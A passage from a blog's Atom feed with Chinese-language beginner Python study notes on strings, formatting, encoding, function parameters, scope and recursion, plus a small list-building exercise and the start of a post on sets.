字符串替换</li><li>join() 河滨，列表或元组中字符串合并为一个字符串</li></ul><figure class="highlight axapta"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs axapta">s=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>))<span class="hljs-meta">#hello,Java</span><br>s1=<span class="hljs-string">'hello,Python,Python,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-number">2</span>))<span class="hljs-meta">#hello,Java</span><br>lst=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'java'</span>,<span class="hljs-string">'python'</span>]<br><span class="hljs-keyword">print</span>(<span class="hljs-string">'|'</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hello|java|python</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hellojavapython</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">'*'</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">'Python'</span>))<span class="hljs-meta">#P*y*t*h*o*n</span><br></code></pre></td></tr></tbody></table></figure><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>运算符<code>&gt; &gt;= &lt; &lt;= == !=</code></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'app'</span>)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'banana'</span>)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(ord(<span class="hljs-string">'a'</span>)</span></span>,<span class="hljs-built_in">ord</span>(<span class="hljs-string">'b'</span>))#<span class="hljs-number">97</span> <span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(chr(<span class="hljs-number">97</span>)</span></span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-id">#a</span> b<br></code></pre></td></tr></tbody></table></figure><p>‘==’ 比较 value</p><p>‘is’ 比较 id</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=b=<span class="hljs-string">'Python'</span><br>c=<span class="hljs-string">'Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a==b)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b==c)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(a)</span></span>,<span class="hljs-built_in">id</span>(b),<span class="hljs-built_in">id</span>(c))#<span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span><br></code></pre></td></tr></tbody></table></figure><h3 id="切片-start-end-step"><a href="#切片-start-end-step" class="headerlink" title="切片 [start:end:step]"></a>切片 [start<span class="github-emoji"><span>🔚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f51a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>step]</h3><p>字符串不可变，切片后将产生新对象</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,python'</span><br><span class="hljs-attribute">s1</span>=s[:5]<br><span class="hljs-attribute">s2</span>=s[6:]<br><span class="hljs-attribute">s3</span>=<span class="hljs-string">'!'</span><br><span class="hljs-attribute">newstr</span>=s1+s3+s2<br><span class="hljs-built_in">print</span>(s1)#hello<br><span class="hljs-built_in">print</span>(s2)#python<br><span class="hljs-built_in">print</span>(s3)#!<br><span class="hljs-built_in">print</span>(newstr)#hello!python<br></code></pre></td></tr></tbody></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul><li>%作占位符 <code>'我叫%s'%(name)</code></li><li>{}作占位符 <code>'我叫{0},今年{1}岁，我真的是{0}'.format(name,age)</code></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫%s,今年%d岁'</span>%(name,age))#我叫张三，今年20岁<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫{0},今年{1}岁'</span>.format(name,age))<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">'我叫{name},今年{age}岁'</span>)<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>d'%<span class="hljs-number">99</span>)#        <span class="hljs-number">99</span>;<span class="hljs-number">10</span>表示宽度<br><span class="hljs-attribute">print</span>('%.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#<span class="hljs-number">3</span>.<span class="hljs-number">142</span>；#.<span class="hljs-number">3</span>表示小数点后三位<br><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>(' ---- ')<br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)) #<span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>))#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br></code></pre></td></tr></tbody></table></figure><h2 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h2><p>编码：字符串转二进制</p><p>解码：二进制转字符串</p><p>GBK中，一个中文占两个字节；UTF-8中，一个中文占三个字节</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'天涯共此时'</span><br><span class="hljs-built_in">print</span>(s.encode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">'GBK'</span>))#b'\xcc\xec\xd1\xc4\xb9\xb2\xb4\xcb\xca\xb1'<br><span class="hljs-attribute">byte</span>=s.encode(encoding='GBK')<br><span class="hljs-built_in">print</span>(byte.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">"GBK"</span>))#天涯共此时<br></code></pre></td></tr></tbody></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建，调用"><a href="#创建，调用" class="headerlink" title="创建，调用"></a>创建，调用</h2><p>（1）函数作用：复用代码，隐藏实现细节，提高可维护性，提高可读性便于调试</p><p>（2）创建：<code>def 函数名([参数]):</code><br>                <code>函数体</code></p><p>（3）调用：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def calc(<span class="hljs-keyword">a</span>,b): <span class="hljs-comment">#a,b为形参，在函数定义处</span><br>    c=<span class="hljs-keyword">a</span>+b<br>    <span class="hljs-literal">return</span> c<br><span class="hljs-built_in">result</span>=calc(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#10，20是实参，在函数调用处</span><br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>（1）位置实参：对应位置进行参数传递</p><p>（2）关键字实参：对应名称进行参数传递</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">result</span>=calc(<span class="hljs-keyword">a</span>=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>)<br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(arg1,arg2):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 11<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44]<br>    <span class="hljs-attribute">arg1</span>=100<br>    arg2.append(10)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 100<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44, 10]<br><span class="hljs-attribute">n1</span>=11<br>n2=[22,33,44]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44]<br>fun(n1,n2)#跳到fun()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44, 10]<br></code></pre></td></tr></tbody></table></figure><blockquote><p>在函数调用过程中，进行参数传递，若是不可变对象，在函数体的修改不会影响实参的值；若可变则会影响</p></blockquote><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>（1）返回值有多个时，结果将以元组形式返回</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(num)</span></span>:<br>    odd=[]#存储奇数<br>    even=[]#存储偶数<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-keyword">if</span> i %<span class="hljs-number">2</span>:<br>            odd.append(i)<br>        <span class="hljs-keyword">else</span>:<br>            even.append(i)<br>    <span class="hljs-keyword">return</span> odd,even<br>lst=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">39</span>,<span class="hljs-number">43</span>,<span class="hljs-number">66</span>,<span class="hljs-number">24</span>]<br>print(<span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(lst)</span></span>)#([<span class="hljs-number">39</span>, <span class="hljs-number">43</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">66</span>, <span class="hljs-number">24</span>])<br></code></pre></td></tr></tbody></table></figure><p>（2）如果返回值没有（函数执行后不需要给调用出提供数据），return可省略；</p><p>若返回值为1个，则直接返回类型；</p><p>若返回值为多个，则返回为元组；</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">fun1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'hello'</span>)<br><span class="hljs-built_in">fun1</span>()#hello<br>def <span class="hljs-built_in">fun2</span>():<br>    return <span class="hljs-string">'hello'</span><br>result=<span class="hljs-built_in">fun2</span>()<br><span class="hljs-built_in">print</span>(result)#hello<br>def <span class="hljs-built_in">fun3</span>():<br>    return <span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">fun3</span>())#(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h2><p>（1）默认值</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a,b=<span class="hljs-number">10</span>)</span></span>:<br>    print(a,b)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">100</span>)</span></span>#<span class="hljs-number">100</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#<span class="hljs-number">20</span> <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><p>（2）个数可变的位置参数（只可为一个），用*定义可变的形参，结果为元组</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(*args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>#(<span class="hljs-number">10</span>,)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>)<br></code></pre></td></tr></tbody></table></figure><p>（3）个数可变的关键字形参（只可为一个），用**定义可变的形参，结果为字典</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(**args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>,c=<span class="hljs-number">30</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'c'</span>: <span class="hljs-number">30</span>}<br></code></pre></td></tr></tbody></table></figure><blockquote><p>函数定义中，二者同为形参时，位置参数放在关键字参数之前</p></blockquote><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b,c):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>fun(10,20,30)#位置传参#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30<br>lst=[11,22,33]<br>fun(*lst)#列表中元素转位置参数传入#<span class="hljs-attribute">a</span>=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33<br>fun(<span class="hljs-attribute">a</span>=100,b=200,c=300)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300<br>dict={<span class="hljs-string">'a'</span>:111,<span class="hljs-string">'b'</span>:222,<span class="hljs-string">'c'</span>:333}<br>fun(*<span class="hljs-number">*d</span>ict)#字典中键值对转关键字参数传入#<span class="hljs-attribute">a</span>=111 <span class="hljs-attribute">b</span>=222 <span class="hljs-attribute">c</span>=333<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,<span class="hljs-attribute">b</span>=10):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>def fun2(<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>def fun3(*<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>fun2(10,20,30,40)#(10, 20, 30, 40)<br>fun3(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44,e=55)#{<span class="hljs-string">'a'</span>: 11, <span class="hljs-string">'b'</span>: 22, <span class="hljs-string">'c'</span>: 33, <span class="hljs-string">'d'</span>: 44, <span class="hljs-string">'e'</span>: 55}<br>def fun4(a,b,c,d):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'d='</span>,d)<br>fun4(10,20,30,40)#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30 <span class="hljs-attribute">d</span>=40<br>fun4(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44)#a=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33 <span class="hljs-attribute">d</span>=44<br>fun4(100,200,<span class="hljs-attribute">c</span>=300,d=400)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300 <span class="hljs-attribute">d</span>=400<br></code></pre></td></tr></tbody></table></figure><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><p>代码可访问该变量的区域</p><p>有效范围：</p><p>（1）局部变量：global声明可将局部变量转为全局变量；局部变量仅在函数体内部有效</p><p>（2）全局变量：函数体外定义的变量，函数体内外都可调用</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b):<br>    <span class="hljs-attribute">c</span>=a+b #c为局部变量<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span>#name为全局变量<br><span class="hljs-built_in">print</span>(name)<br>def fun1():<br>    <span class="hljs-built_in">print</span>(name)<br>fun1()#张三<br>def fun2():<br>    global age<br>    <span class="hljs-attribute">age</span>=20<br>    <span class="hljs-built_in">print</span>(age)<br>fun2()<br><span class="hljs-built_in">print</span>(age)<br></code></pre></td></tr></tbody></table></figure><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>（1）一个函数在函数体内调用本身，即为递归</p><p>（2）组成：递归调用与终止条件</p><p>（3）每递归调用一次，就在栈内分配一个战阵，执行完之后再释放</p><p>（4）优点：思路代码简单；缺点：占用内存多，效率低</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fac</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> n*fac(n-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(fac(<span class="hljs-number">6</span>))<span class="hljs-comment">#720</span><br></code></pre></td></tr></tbody></table></figure><p>斐波那契数列：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(n):<br>    <span class="hljs-attribute">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">elif</span> n==<span class="hljs-number">2</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">return</span> fib(n-<span class="hljs-number">1</span>)+fib(n-<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(fib(<span class="hljs-number">8</span>))#<span class="hljs-number">21</span><br> <span class="hljs-comment">#输出前六位</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    <span class="hljs-attribute">print</span>(fib(i))#<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">8</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;字符串&quot;&gt;&lt;a href=&quot;#字符串&quot; class=&quot;headerlink&quot; title=&quot;字符串&quot;&gt;&lt;/a&gt;字符串&lt;/h1&gt;&lt;p&gt;python基本数据类型，不可变字符序列&lt;/p&gt;
&lt;h2 id=&quot;驻留机制&quot;&gt;&lt;a href=&quot;#驻留机制&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python学习随笔记录</title>
    <link href="https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"/>
    <id>https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/</id>
    <published>2022-09-11T03:14:15.901Z</published>
    <updated>2022-09-14T14:58:43.042Z</updated>
    
    <content type="html"><![CDATA[<ul><li>strip() 删除两边空格</li><li>lstrip() 删除左边空格</li><li>rstrip() 删除右边空格</li><li>replace(“ “,””) 删除所有空格</li><li>split() 先切分</li><li>join() 再拼接</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>描述</p><p>一串连续的数据用什么记录最合适，牛牛认为在Python中非列表（list）莫属了。现输入牛牛朋友们的名字，请使用list函数与split函数将它们封装成列表，再整个输出列表。</p><p>输入描述：</p><p>输入一串字符串，它们之间通过空格间隔开。</p><p>输出描述：</p><p>输出封装后的列表。</p><p>示例1</p><p>输入：<code>NiuNiu NiuMei NiuNeng</code></p><p>输出：<code>['NiuNiu', 'NiuMei', 'NiuNeng']</code></p><p>解：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">name=<span class="hljs-selector-tag">input</span>()<span class="hljs-selector-class">.split</span>(<span class="hljs-string">" "</span>)<br>name_list=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> name:<br>    name_list<span class="hljs-selector-class">.append</span>(i)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(name_list)</span></span><br></code></pre></td></tr></tbody></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><ul><li>bin(x) 转二进制</li><li>hex(x) 转十六进制</li><li>ord(x) 字母转数字</li><li>abs(x) 转绝对值</li><li>sum(x) 算数和</li><li>max(x) 最大值</li><li>min(x) 最小值</li><li>count() 计数</li><li>pow() 幂乘 x**y=pow(x,y)</li><li>x.isalpha() 判断字符串中是否只包含字母</li><li>x.isdigit() 判断字符串中是否只包含数字</li><li>x.isspace() 判断字符串中是否只包含空格</li><li>find() 查找字符串</li><li>round(f,n) 输出f四舍五入保留至n位小数后的结果</li><li>eval() 公式计算器</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;strip() 删除两边空格&lt;/li&gt;
&lt;li&gt;lstrip() 删除左边空格&lt;/li&gt;
&lt;li&gt;rstrip() 删除右边空格&lt;/li&gt;
&lt;li&gt;replace(“ “,””) 删除所有空格&lt;/li&gt;
&lt;li&gt;split() 先切分&lt;/li&gt;
&lt;li&gt;join</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习5</title>
    <link href="https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/"/>
    <id>https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/</id>
    <published>2022-09-06T08:43:42.900Z</published>
    <updated>2022-09-06T10:08:01.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>python内置数据结构，可变序列，无value的字典。</p><h2 id="创建："><a href="#创建：" class="headerlink" title="创建： {}"></a>创建： {}</h2><ul><li><code>s={'Python','world',90}</code></li><li>set() : <code>s=set(range(6))</code></li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}<br></code></pre></td></tr></tbody></table></figure><p>eg: </p><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">s1=<span class="hljs-keyword">set</span>(range(<span class="hljs-number">6</span>))<br>print(s,type(s)) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>} &lt;<span class="hljs-keyword">class</span> '<span 